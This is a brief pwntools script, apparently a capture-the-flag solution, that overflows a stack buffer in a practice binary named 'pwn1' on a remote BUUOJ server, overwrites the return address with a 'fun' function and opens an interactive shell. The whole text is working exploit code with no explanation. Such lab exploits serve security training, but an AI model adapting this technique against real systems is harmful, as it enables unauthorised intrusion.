from pwn import *

context.binary = exe = ELF('./pwn1', checksec=False)
p = remote('node4.buuoj.cn', 28764)
#p = process(exe.path)

payload = b'a' * 23 + p64(exe.sym['fun'] + 1)
p.sendline(payload)
p.interactive()
